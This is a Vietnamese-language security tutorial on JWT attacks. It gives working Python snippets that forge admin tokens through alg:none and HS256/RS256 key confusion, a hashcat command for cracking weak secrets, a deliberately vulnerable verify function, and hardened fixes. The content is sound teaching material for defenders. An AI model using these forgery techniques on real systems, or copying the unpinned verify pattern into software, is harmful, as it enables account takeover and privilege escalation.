# JWT Attacks

> **OWASP Top 10:2025**: A07:2025 – Authentication Failures | **CWE**: CWE-345, CWE-347 | **Nguồn**: PortSwigger, Auth0, CWE MITRE

## 🧱 Kiến thức Nền tảng

JSON Web Token (JWT) là chuẩn mở (RFC 7519) để truyền thông tin xác thực giữa các bên dưới dạng JSON object được ký số. JWT gồm 3 phần phân cách bằng dấu chấm: **Header** (thuật toán ký), **Payload** (dữ liệu/claims), và **Signature** (chữ ký xác minh tính toàn vẹn).

Hai loại thuật toán ký phổ biến:
- **HS256 (HMAC-SHA256)**: Ký đối xứng — cùng một secret key dùng để ký và xác minh.
- **RS256 (RSA-SHA256)**: Ký bất đối xứng — private key ký, public key xác minh.

```javascript
// Normal JWT creation and verification flow
const jwt = require('jsonwebtoken');

// Server creates JWT after successful login
function generateToken(user) {
    const payload = {
        sub: user.id,
        username: user.username,
        role: user.role,
        iat: Math.floor(Date.now() / 1000),
        exp: Math.floor(Date.now() / 1000) + 3600  // 1 hour expiry
    };
    
    // Sign with secret key (HS256) or private key (RS256)
    return jwt.sign(payload, process.env.JWT_SECRET, { algorithm: 'HS256' });
}

// Server verifies JWT on each request
function verifyToken(token) {
    return jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] });
}
```

Server tin tưởng nội dung JWT nếu chữ ký hợp lệ. Nhưng nếu quá trình xác minh bị cấu hình sai, attacker có thể giả mạo token để leo thang đặc quyền.

## 🔍 Mô tả lỗ hổng

JWT attacks khai thác các lỗi trong quá trình ký và xác minh token: chấp nhận thuật toán `none` (không ký), nhầm lẫn giữa symmetric/asymmetric key, sử dụng secret key yếu dễ brute-force, hoặc cho phép attacker inject JWK/JKU header để server dùng key do attacker kiểm soát.

## ⚔️ Cơ chế tấn công

**1. Algorithm "none" Attack — bỏ hoàn toàn chữ ký:**

```python
import base64, json

# Craft a JWT with algorithm set to "none"
header = base64.urlsafe_b64encode(json.dumps(
    {"alg": "none", "typ": "JWT"}
).encode()).decode().rstrip('=')

payload = base64.urlsafe_b64encode(json.dumps(
    {"sub": "1", "username": "admin", "role": "admin"}
).encode()).decode().rstrip('=')

# No signature needed — just append a trailing dot
forged_token = f"{header}.{payload}."
print(forged_token)
# If server accepts alg:none, attacker is now admin
```

**2. HS256/RS256 Confusion — dùng public key làm HMAC secret:**

```python
# Attacker knows the RS256 public key (often publicly available)
# Tricks the server into treating it as HS256 symmetric secret
import jwt

public_key = open('public_key.pem').read()

# Sign with public key using HS256 (instead of RS256)
forged = jwt.encode(
    {"sub": "1", "role": "admin"},
    public_key,
    algorithm="HS256"
)
# If server uses same key for verify without checking algorithm,
# it verifies HS256 signature with the public key — SUCCESS
```

**3. Weak Secret Brute Force:**

```bash
# Use hashcat to crack JWT secret
hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
# If secret is weak (e.g., "secret123"), it cracks in seconds
```

## 🛡️ Biện pháp phòng thủ

1. **Whitelist algorithms**: Luôn chỉ định danh sách thuật toán được chấp nhận khi verify, **không bao giờ** để server tự chọn từ header.
2. **Strong secrets**: Sử dụng secret key tối thiểu 256-bit ngẫu nhiên cho HS256, hoặc RSA key ≥ 2048-bit cho RS256.
3. **Reject "none" algorithm**: Đảm bảo library JWT không chấp nhận `alg: none`.
4. **Use established libraries**: Sử dụng thư viện JWT đã được kiểm định (jose, jsonwebtoken) và cập nhật thường xuyên.

## 💻 Code Example

```javascript
// VULNERABLE: accepts any algorithm from token header
function verifyTokenUnsafe(token) {
    // Library reads algorithm from JWT header — attacker controls this!
    return jwt.verify(token, publicKey);
}
```

```javascript
// SECURE: strict algorithm whitelist and key binding
function verifyTokenSafe(token) {
    return jwt.verify(token, process.env.JWT_SECRET, {
        algorithms: ['HS256'],     // Only accept HS256, reject none/RS256
        issuer: 'myapp.com',       // Validate issuer claim
        audience: 'myapp-users',   // Validate audience claim
        maxAge: '1h',              // Reject tokens older than 1 hour
        clockTolerance: 30         // Allow 30s clock skew
    });
}
```

## 📚 Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/jwt
- Auth0: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
- CWE: https://cwe.mitre.org/data/definitions/345.html
